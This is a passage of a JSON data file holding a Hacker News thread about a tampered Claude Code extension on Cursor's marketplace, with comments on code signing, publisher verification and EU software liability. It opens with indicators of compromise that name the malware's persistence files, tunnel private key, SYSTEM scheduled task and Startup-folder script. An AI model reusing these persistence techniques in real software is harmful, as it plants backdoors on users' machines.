persistence~/.config/smt.cmd and ~/.config/smtkWindowsPersistence batch script and tunnel private keyScheduled task SysMonWindowsStartup scheduled task (requests SYSTEM)%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdWindowsStartup folder fallback script"
+  ],
+  "highlightsZh": [],
+  "translationStatus": "translated",
+  "contentHash": "2e4a77fd85675f0f1a681c3b95e55843d03aa1dbc783adfe2c6de64555fc40aa",
+  "comments": [
+    {
+      "id": 50304129,
+      "commentKey": "hackernews-50304129",
+      "parentId": 50300683,
+      "author": "felixrieseberg",
+      "publishedAt": "2026-10-30T14:08:52.000Z",
+      "level": 1,
+      "hnUrl": "https://news.ycombinator.com/item?id=50304129",
+      "sourceUrl": "https://news.ycombinator.com/item?id=50304129",
+      "textRawHtml": "Felix from Anthropic here.<p>We’re working with Cursor on this incident, but it wasn’t a compromise of Anthropic’s systems or employee laptops. A malicious actor used access to Cursor’s marketplace to publish a tampered copy of the Claude Code extension, which we didn’t build or publish. The versions on our official channels are not affected and this only impacts Cursor users.</p>",
+      "textZhHtml": "Felix from Anthropic here.<p>We’re working with Cursor on this incident, but it wasn’t a compromise of Anthropic’s systems or employee laptops. A malicious actor used access to Cursor’s marketplace to publish a tampered copy of the Claude Code extension, which we didn’t build or publish. The versions on our official channels are not affected and this only impacts Cursor users.</p>",
+      "translationStatus": "translated",
+      "contentHash": "f37f565fe7e421a5b15ea0bd5d6fd83e12379758692142c9c66bec04d91d2bc8",
+      "children": [
+        {
+          "id": 50309617,
+          "commentKey": "hackernews-50309617",
+          "parentId": 50304129,
+          "author": "tzone",
+          "publishedAt": "2026-10-30T20:21:31.000Z",
+          "level": 2,
+          "hnUrl": "https://news.ycombinator.com/item?id=50309617",
+          "sourceUrl": "https://news.ycombinator.com/item?id=50309617",
+          "textRawHtml": "You can say that this isn't compromise of Anthropic, but it sort of is in the setup. Cursor Claude extension is marked as something made by Anthropic, so default assumption is that only people who can release that new extension would be a team at Anthropic.<p>Since that is clearly not the case, that is just as much Anthropic's problem as it is Cursor's problem. There either needs to be a technical change so that extensions are signed with keys that Anthropic controls, or you should take the branding off from the Cursor extensions.</p>",
+          "textZhHtml": "You can say that this isn't compromise of Anthropic, but it sort of is in the setup. Cursor Claude extension is marked as something made by Anthropic, so default assumption is that only people who can release that new extension would be a team at Anthropic.<p>Since that is clearly not the case, that is just as much Anthropic's problem as it is Cursor's problem. There either needs to be a technical change so that extensions are signed with keys that Anthropic controls, or you should take the branding off from the Cursor extensions.</p>",
+          "translationStatus": "translated",
+          "contentHash": "75fd247398241f918dd0c8ac28f611c9f763558940ae2d4f19a9b749d38e9d06",
+          "children": [
+            {
+              "id": 50311455,
+              "commentKey": "hackernews-50311455",
+              "parentId": 50309617,
+              "author": "ghshephard",
+              "publishedAt": "2026-10-30T23:24:52.000Z",
+              "level": 3,
+              "hnUrl": "https://news.ycombinator.com/item?id=50311455",
+              "sourceUrl": "https://news.ycombinator.com/item?id=50311455",
+              "textRawHtml": "I was working on the clearly mistaken impression that \"Made by Anthropic\" in the cursor store meant that the artifact had been signed by Anthropic.    If that is not the case, then two party's need to get their act together:<p></p><pre><code>  - Cursor needs to add signing if they want to claim something was \"made\" by another party.\n\n  - Anthropic needs to stamp out any provider from using said, \"Made by Anthropic\" until they start adding signing to their process.   Trademark law is useful here.\n\n</code></pre>\nUntil that happens - it's almost like you have to delete any extension from the Cursor Store off of your Cursor instance - kind of a crapshoot what you are actually downloading, no?<p>For example - what guarantee do I have with something like: \n\" This publisher has verified ownership of cursor.com\" - when I'm looking at the WSL extension.   Are there any guarantees it's not been replaced with some other extension?</p>",
+              "textZhHtml": "I was working on the clearly mistaken impression that \"Made by Anthropic\" in the cursor store meant that the artifact had been signed by Anthropic.    If that is not the case, then two party's need to get their act together:<p></p><pre><code>  - Cursor needs to add signing if they want to claim something was \"made\" by another party.\n\n  - Anthropic needs to stamp out any provider from using said, \"Made by Anthropic\" until they start adding signing to their process.   Trademark law is useful here.\n\n</code></pre>\nUntil that happens - it's almost like you have to delete any extension from the Cursor Store off of your Cursor instance - kind of a crapshoot what you are actually downloading, no?<p>For example - what guarantee do I have with something like: \n\" This publisher has verified ownership of cursor.com\" - when I'm looking at the WSL extension.   Are there any guarantees it's not been replaced with some other extension?</p>",
+              "translationStatus": "translated",
+              "contentHash": "b05b4974ae099b2cb02480a3a5614dac396236a25a7aeff7625e5782e4c48299",
+              "children": [
+                {
+                  "id": 50311556,
+                  "commentKey": "hackernews-50311556",
+                  "parentId": 50311455,
+                  "author": "AtNightWeCode",
+                  "publishedAt": "2026-10-30T23:36:08.000Z",
+                  "level": 4,
+                  "hnUrl": "https://news.ycombinator.com/item?id=50311556",
+                  "sourceUrl": "https://news.ycombinator.com/item?id=50311556",
+                  "textRawHtml": "The core problem is that VScode extensions does not need to be signed at all. Mind boggling stupid design decision.",
+                  "textZhHtml": "The core problem is that VScode extensions does not need to be signed at all. Mind boggling stupid design decision.",
+                  "translationStatus": "translated",
+                  "contentHash": "9c90740f643d88022551582ba0e686c00836832f3e21a15a5b0a59c6e2365377",
+                  "children": [
+                    {
+                      "id": 50311743,
+                      "commentKey": "hackernews-50311743",
+                      "parentId": 50311556,
+                      "author": "Rohansi",
+                      "publishedAt": "2026-10-30T23:59:06.000Z",
+                      "level": 5,
+                      "hnUrl": "https://news.ycombinator.com/item?id=50311743",
+                      "sourceUrl": "https://news.ycombinator.com/item?id=50311743",
+                      "textRawHtml": "Isn't the Cursor Marketplace separate from VSCode's? Maybe it's as simple as someone impersonating Anthropic because they never registered there? Code signing alone wouldn't help in cases like that.",
+                      "textZhHtml": "Isn't the Cursor Marketplace separate from VSCode's? Maybe it's as simple as someone impersonating Anthropic because they never registered there? Code signing alone wouldn't help in cases like that.",
+                      "translationStatus": "translated",
+                      "contentHash": "687cad13e3d1ecafa2c5570ac8db82863d687b45c61578156ef66c244cd59b78",
+                      "children": [
+                        {
+                          "id": 50311999,
+                          "commentKey": "hackernews-50311999",
+                          "parentId": 50311743,
+                          "author": "yubblegum",
+                          "publishedAt": "2026-10-31T00:31:49.000Z",
+                          "level": 6,
+                          "hnUrl": "https://news.ycombinator.com/item?id=50311999",
+                          "sourceUrl": "https://news.ycombinator.com/item?id=50311999",
+                          "textRawHtml": "Vendor A publishes a public key on their site for authenticating any signature. There is an entire subset of cryptography dedicated to addressing these needs. This is just yet another software player, Cursor, taking the absolutely easy no effort path because otherwise they would be, I don't know, \"losers\". I mean only losers would setup a basic authenticated provinance for bits of code they are pushing to the world to be executed by all and sundry. Really, this profession has become a complete clown show.",
+                          "textZhHtml": "Vendor A publishes a public key on their site for authenticating any signature. There is an entire subset of cryptography dedicated to addressing these needs. This is just yet another software player, Cursor, taking the absolutely easy no effort path because otherwise they would be, I don't know, \"losers\". I mean only losers would setup a basic authenticated provinance for bits of code they are pushing to the world to be executed by all and sundry. Really, this profession has become a complete clown show.",
+                          "translationStatus": "translated",
+                          "contentHash": "b767c45b6a515b2083622fb931a908201af5596feb4edc9c94d9e98aa9a3c3b9",
+                          "children": [
+                            {
+                              "id": 50313007,
+                              "commentKey": "hackernews-50313007",
+                              "parentId": 50311999,
+                              "author": "still_grokking",
+                              "publishedAt": "2026-10-31T03:42:07.000Z",
+                              "level": 7,
+                              "hnUrl": "https://news.ycombinator.com/item?id=50313007",
+                              "sourceUrl": "https://news.ycombinator.com/item?id=50313007",
+                              "textRawHtml": "&gt; Really, this profession has become a complete clown show.<p>Always has been because there is so far zero liability for anything someone programs and distributes commercially. That's the <i>single root cause</i>. If not that software wouldn't be in general such major shit show. What we have is the result of being allowed to throw out even the most toxic shit out without any consequences if it causes damage, no mater how large the damage is. Software companies caused so far over the decades likely hundreds of billions, or even a few trillion damages in sum, yet nobody responsible ever got the bill. It's wild west—since now over 60 years. This has to stop finally!</p><p>Let's see where things will move as soon as we have regular product liability for software:</p><p><a href=\"https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum:4792027\" rel=\"nofollow\">https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum...</a></p><p>Just a few days left! Looking forward.</p>",
+                              "textZhHtml": "&gt; Really, this profession has become a complete clown show.<p>Always has been because there is so far zero liability for anything someone programs and distributes commercially. That's the <i>single root cause</i>. If not that software wouldn't be in general such major shit show. What we have is the result of being allowed to throw out even the most toxic shit out without any consequences if it causes damage, no mater how large the damage is. Software companies caused so far over the decades likely hundreds of billions, or even a few trillion damages in sum, yet nobody responsible ever got the bill. It's wild west—since now over 60 years. This has to stop finally!</p><p>Let's see where things will move as soon as we have regular product liability for software:</p><p><a href=\"https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum:4792027\" rel=\"nofollow\">https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum...</a></p><p>Just a few days left! Looking forward.</p>",
+                              "translationStatus": "translated",
+                              "contentHash": "1f4d61a0f994779c372eecf582913891c4605b0ce0c2caef9f968f2fe04b7189",
+                              "children": [
+                                {
+                                  "id": 50313676,
+                                  "commentKey": "hackernews-50313676",
+                                  "parentId": 50313007,
+                                  "author": "rixed",
+                                  "publishedAt": "2026-10-31T06:18:57.000Z",
+                                  "level": 8,
+                                  "hnUrl": "https://news.ycombinator.com/item?id=50313676",
+                                  "sourceUrl": "https://news.ycombinator.com/item?id=50313676",
+                                  "textRawHtml": "That, and NIS2. Looks like a good trend, hopefully it's not just protectionism.",
+                                  "textZhHtml": "That, and NIS2. Looks like a good trend, hopefully it's not just protectionism.",
+                                  "translationStatus": "translated",
+                                  "contentHash": "e27eae38383f4c8afd9cff6b007ef633d3bdd932772b1a2355e5633b879d5c8e",
+                                  "children": [
+                                    {
+                                      "id": 50314194,
+                                      "commentKey": "hackernews-50314194",
+                                      "parentId": 50313676,
+                                      "author": "still_grokking",
+                                      "publishedAt": "2026-10-31T08:29:57.000Z",
+                                      "level": 9,
+                                      "hnUrl": "https://news.ycombinator.com/item?id=50314194",
+                                      "sourceUrl": "https://news.ycombinator.com/item?id=50314194",
+                                      "textRawHtml": "Well, if something than it's \"anti-protectionism\".<p>This is going to cause some major argument between the EU and the US, maybe even a trade war. Trouble is already underway:</p><p><a href=\"https://www.reuters.com/legal/government/us-lawmakers-urge-trump-act-against-eu-tech-rules-suggest-trade-probes-2026-07-21/\" rel=\"nofollow\">https://www.reuters.com/legal/government/us-lawmakers-urge-t...</a></p><p>Despite that I also think that this is the right and long overdue move on the EU side. We need to break the basic pattern that nobody cares as long as the responsible effectively never get the bill when they mess up.</p><p>Software is \"Unsafe at Any Speed\" [ <a href=\"https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed</a> ] to bring a striking analogy — even we have since about 60 years the tech to build software which <i>provably</i> (in the mathematical sense) matches its specification. Still what you have on the market is utter garbage, and instead of getting better it gets currently actually worse with lowering the garbage quality level even more with \"AI\" slop. That EU legislation could become the escape hatch; that's why I'm looking forward.</p>",
+                                      "textZhHtml": "Well, if something than it's \"anti-protectionism\".<p>This is going to cause some major argument between the EU and the US, maybe even a trade war. Trouble is already underway:</p><p><a href=\"https://www.reuters.com/legal/government/us-lawmakers-urge-trump-act-against-eu-tech-rules-suggest-trade-probes-2026-07-21/\" rel=\"nofollow\">https://www.reuters.com/legal/government/us-lawmakers-urge-t...</a></p><p>Despite that I also think that this is the right and long overdue move on the EU side. We need to break the basic pattern that nobody cares as long as the responsible effectively never get the bill when they mess up.</p><p>Software is \"Unsafe at Any Speed\" [ <a href=\"https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed</a> ] to bring a striking analogy — even we have since about 60 years the tech to build software which <i>provably</i> (in the mathematical sense) matches its specification. Still what you have on the market is utter garbage, and instead of getting better it gets currently actually worse with lowering the garbage quality level even more with \"AI\" slop. That EU legislation could become the escape hatch; that's why I'm looking forward.</p>",
+                                      "translationStatus": "translated",
+                                      "contentHash": "baf22601c94337a0b4d1111588af4d7b52bfd4f4e7a3ccc5d16212babb592588",
+                                      "children": [],
+                                      "isDeleted": false
+                                    }
+                                  ],
+                                  "isDeleted": false
+                                },
+                                {
+                                  "id": 50314223,
+                                  "commentKey": "hackernews-50314223",
+                                  "parentId": 50313007,
+                                  "author": "duskdozer",
+                                  "publishedAt": "2026-10-31T08:38:39.000Z",
+                                  "level": 8,
+                                  "hnUrl": "https://news.ycombinator.com/item?id=50314223",
+                                  "sourceUrl": "https://news.ycombinator.com/item?id=50314223",
+                                  "textRawHtml": "I'm having trouble understanding what effects that directive could have. Liability under what circumstances and to what degree?",
+                                  "textZhHtml": "I'm having trouble understanding what effects that directive could have. Liability under what circumstances and to what degree?",
+                                  "translationStatus": "translated",
+                                  "contentHash": "ac829ad43ef6c4d365e6dc0a121d6028e70d092ad9e92f6e70d6782741d21479",
+                                  "children": [
+                                    {
+                                      "id": 50315698,
+                                      "commentKey": "hackernews-50315698",
+                                      "parentId": 50314223,
+                                      "author": "still_grokking",
+                                      "publishedAt": "2026-10-31T12:47:43.000Z",
+                                      "level": 9,
+                                      "hnUrl": "https://news.ycombinator.com/item?id=50315698",
+                                      "sourceUrl": "https://news.ycombinator.com/item?id=50315698",
+                                      "textRawHtml": "It's the biggest fundamental change which ever happened in how software is treated legally. This is a revolution!<p>Under the new legislation software products become regular products; there is no liability exception any more.</p><p>If you commercially distribute defective products to end user you're in general liable for the damages these defective products cause. <i>This now includes pure software just as any other (physical) product on the market.</i></p><p>If you don't know how product liability generally works in the EU, and what this means for software see here:</p><p><a href=\"https://cms.law/en/int/publication/the-new-eu-product-liability-directive-eu-2024-2853\" rel=\"nofollow\">https://cms.law/en/int/publication/the-new-eu-product-liabil...</a></p>",
+                                      "textZhHtml": "It's the biggest fundamental change which ever happened in how software is treated legally. This is a revolution!<p>Under the new legislation software products become regular products; there is no liability exception any more.</p><p>If you commercially distribute defective products to end user you're in general liable for the damages these defective products cause. <i>This now includes pure software just as any other (physical) product on the market.</i></p><p>If you don't know how product liability generally works in the EU, and what this means for software see here:</p><p><a href=\"https://cms.law/en/int/publication/the-new-eu-product-liability-directive-eu-2024-2853\" rel=\"nofollow\">https://cms.law/en/int/publication/the-new-eu-product-liabil...</a></p>",
+                                      "translationStatus": "translated",
+                                      "contentHash": "c1cbc6ec78070b4b688d8d386f9982f86690f88428683fdab095a97469e53c4a",
+                                      "children": [],
+                                      "isDeleted": false
+                                    }
+                                  ],
+                                  "isDeleted": false
+                                }
+                              ],
+                              "isDeleted": false
+                            },
+                            {
+                              "id": 50312207,
+                              "commentKey": "hackernews-50312207",
+                              "parentId": 50311999,
+                              "author": "Rohansi",
+                              "publishedAt": "2026-10-31T01:04:45.000Z",
+                              "level": 7,
+                              "hnUrl": "https://news.ycombinator.com/item?id=50312207",
+                              "sourceUrl": "https://news.ycombinator.com/item?id=50312207",
+                              "textRawHtml": "I don't think even VSCode does this. Probably not even any package managers I know of? Code signing, yes, but not for organization verification? It's pretty much like a username - anyone can claim it if it is unclaimed?<p>edit: VSCode has a verified marker for publishers but I don't know how that works or if Cursor does the same.</p>",
+                              "textZhHtml": "I don't think even VSCode does this. Probably not even any package managers I know of? Code signing, yes, but not for organization verification? It's pretty much like a username - anyone can claim it if it is unclaimed?<p>edit: VSCode has a verified marker for publishers but I don't know how that works or if Cursor does the same.</p>",
+                              "translationStatus": "translated",
+                              "contentHash": "cf72f3e516cae0b89ddec2cd4575f21c90c4fb1e38985025ba0da46d0d08ca22",
+                              "children": [
+                                {
+                                  "id": 50312613,
+                                  "commentKey": "hackernews-50312613",
+                                  "parentId": 50312207,
+                                  "author": "yunnpp",
+                                  "publishedAt": "2026-10-31T02:14:32.000Z",
+                                  "level": 8,
+                                  "hnUrl": "https://news.ycombinator.com/item?id=50312613",
+                                  "sourceUrl": "https://news.ycombinator.com/item?id=50312613",
+                                  "textRawHtml": "This is a solved problem, just look at how EFF's certbot works. You cannot just claim that you are porn.com unless you put a payload there that matches what the bot expects.",
+                                  "textZhHtml": "This is a solved problem, just look at how EFF's certbot works. You cannot just claim that you are porn.com unless you put a payload there that matches what the bot expects.",
+                                  "translationStatus": "translated",
+                                  "contentHash": "361ed31ee99d9648d37dbf418579d50124280b81e7b67c869654827c67ef9ebc",
+                                  "children": [
+                                    {
+                                      "id": 50313157,
+                                      "commentKey": "hackernews-50313157",
+                                      "parentId": 50312613,
+                                      "author": "Rohansi",
+                                      "publishedAt": "2026-10-31T04:15:03.000Z",
+                                      "level": 9,
+                                      "hnUrl": "https://news.ycombinator.com/item?id=50313157",
+                                      "sourceUrl": "https://news.ycombinator.com/item?id=50313157",
+                                      "textRawHtml": "And force everyone who wants to publish an extension to buy and manage a domain name? What if it expires? You're just replacing one set of problems with another.",
+                                      "textZhHtml": "And force everyone who wants to publish an extension to buy and manage a domain name? What if it expires? You're just replacing one set of problems with another.",
+                                      "translationStatus": "translated",
+                                      "contentHash": "0d19cc8069628c86f23b3ddc6cdac7947eda97ebae2ac316a4b2db2d488f6a42",
+                                      "children": [
+                                        {
+                                          "id": 50317632,
+                                          "commentKey": "hackernews-50317632",
+                                          "parentId": 50313157,
+                                          "author": "yunnpp",
+                                          "publishedAt": "2026-10-31T16:34:38.000Z",
+                                          "level": 10,
+                                          "hnUrl": "https://news.ycombinator.com/item?id=50317632",
+                                          "sourceUrl": "https://news.ycombinator.com/item?id=50317632",
+                                          "textRawHtml": "You don't need to force everyone, both an coexist in this context. I do believe a company with nearly a trillion dollars of planned expenditure can afford to buy a domain and renew it prior to expiration.",
+                                          "textZhHtml": "You don't need to force everyone, both an coexist in this context. I do believe a company with nearly a trillion dollars of planned expenditure can afford to buy a domain and renew it prior to expiration.",
+                                          "translationStatus": "translated",
+                                          "contentHash": "0b03b519680782e25dd291c2acab3e35718bfd42c665f5c45fb7ea8341bcd1dc",
+                                          "children": [
+                                            {
+                                              "id": 50317812,
+                                              "commentKey": "hackernews-50317812",
+                                              "parentId": 50317632,
+                                              "author": "Rohansi",
+                                              "publishedAt": "2026-10-31T16:54:03.000Z",
+                                              "level": 11,
+                                              "hnUrl": "https://news.ycombinator.com/item?id=50317812",
+                                              "sourceUrl": "https://news.ycombinator.com/item?id=50317812",
+                                              "textRawHtml": "Then you would have the same problem. Anthropic has no presence on the Cursor Marketplace, so what is stopping someone from claiming the name and just not associating a domain name?",
+                                              "textZhHtml": "Then you would have the same problem. Anthropic has no presence on the Cursor Marketplace, so what is stopping someone from claiming the name and just not associating a domain name?",
+                                              "translationStatus": "translated",
+                                              "contentHash": "02e51f14b82a7de434aca2fa18afd454cb6d53e84847cad31158a0f273fb6f52",
+                                              "children": [
+                                                {
+                                                  "id": 50318436,
+                                                  "commentKey": "hackernews-50318436",
+                                                  "parentId": 50317812,
+                                                  "author": "yunnpp",
+                                                  "publishedAt": "2026-10-31T18:07:40.000Z",
+                                                  "level": 12,
+                                                  "hnUrl": "https://news.ycombinator.com/item?id=50318436",
+                                                  "sourceUrl": "https://news.ycombinator.com/item?id=50318436",
+                                                  "textRawHtml": "Nothing, but that extension would be flagged as \"unknown\" or \"third-party\" source or something and you'd get a big warning before proceeding to install it.<p>Also, a basic scan of the package would have flagged an ssh backdoor, no? It didn't seem to me like its obfuscation was very sophisticated.</p>",
+                                                  "textZhHtml": "Nothing, but that extension would be flagged as \"unknown\" or \"third-party\" source or something and you'd get a big warning before proceeding to install it.<p>Also, a basic scan of the package would have flagged an ssh backdoor, no? It didn't seem to me like its obfuscation was very sophisticated.</p>",
+                                                  "translationStatus": "translated",
+                                                  "contentHash": "b8418199cfc1a3e649526d974e778c217e6d5a7f1de289689d2b70903e21096f",
+                                                  "children": [],
+                                                  "isDeleted": false
+                                                }
+                                              ],
+                                              "isDeleted": false
+                                            }
+                                          ],
+                                          "isDeleted": false
+                                        },
+                                        {
+                                          "id": 50314310,
+                                          "commentKey": "hackernews-50314310",
+                                          "parentId": 50313157,
+                                          "author": "dkersten",
+                                          "publishedAt": "2026-10-31T09:03:06.000Z",
+                                          "level": 10,
+                                          "hnUrl": "https://news.ycombinator.com/item?id=50314310",
+                                          "sourceUrl": "https://news.ycombinator.com/item?id=50314310",
+                                          "textRawHtml": "You could make it a requirement only for people who want to attribute “made by”. If you publish a no name extension, you could skip it.",
+                                          "textZhHtml": "You could make it a requirement only for people who want to attribute “made by”. If you publish a no name extension, you could skip it.",
+                                          "translationStatus": "translated",
+                                          "contentHash": "a8fd6f0a924fd49fe86d0985c75cc50a2e05396c16702b31d99bd2b2a1d81925",
+                                          "children": [],
+                                          "isDeleted": false
+                                        }
+                                      ],
+                                      "isDeleted": false
+                                    }
+                                  ],
+                                  "isDeleted": false
+                                },
+                                {
+                                  "id": 50312683,
+                                  "commentKey": "hackernews-50312683",
+                                  "parentId": 50312207,
+                                  "author": "skydhash",
+                                  "publishedAt": "2026-10-31T02:30:26.000Z",
+                                  "level": 8,
+                                  "hnUrl": "https://news.ycombinator.com/item?id=50312683",
+                                  "sourceUrl": "https://news.ycombinator.com/item?id=50312683",
+                                  "textRawHtml": "&gt; Code signing, yes, but not for organization verification<p>They don’t do organization verification, but they do verify where code comes from. You may be sure that packages are built by alpine, which made sure that the dist files comes from the sources that the maintainers added, and the latter ensure that the sources are correct. In truth, it’s a very small circle of trust.</p>",
+                                  "textZhHtml": "&gt; Code signing, yes, but not for organization verification<p>They don’t do organization verification, but they do verify where code comes from. You may be sure that packages are built by alpine, which made sure that the dist files comes from the sources that the maintainers added, and the latter ensure that the sources are correct. In truth, it’s a very small circle of trust.</p>",
+                                  "translationStatus": "translated",
+                                  "contentHash": "f4c19efd2703f34627797f78c25e7602c1a71f5d0c254d6604afb45933c6e0d2",
+                                  "children": [],
+                                  "isDeleted": false
+                                },
+                                {
+                                  "id": 50313568,
+                                  "commentKey": "hackernews-50313568",
+                                  "parentId": 50312207,
+                                  "author": "feross",
+                                  "publishedAt": "2026-10-31T05:59:16.000Z",
+                                  "level": 8,
+                                  "hnUrl": "https://news.ycombinator.com/item?id=50313568",
+                                  "sourceUrl": "https://news.ycombinator.com/item?id=50313568",
+                                  "textRawHtml": "[flagged]",
+                                  "textZhHtml": "[flagged]",
+                                  "translationStatus": "translated",
+                                  "contentHash": "8aaafe6e059f7d3340a60f8e7e730811696e5368d220a89cbd4c02d621f78ae4",
+                                  "children": [],
+                                  "isDeleted": true
+                                }
+                              ],
+                              "isDeleted": false
+                            }
+                          ],
+                          "isDeleted": false
+                        }
+                      ],
+                      "isDeleted": false
+                    }
+                  ],
+                  "isDeleted": false
+                }
+              ],
+              "isDeleted": false
+            }
+          ],
+          "isDeleted": false
+        }
+      ],
+      "isDeleted": false
+    }
+  ]
+}
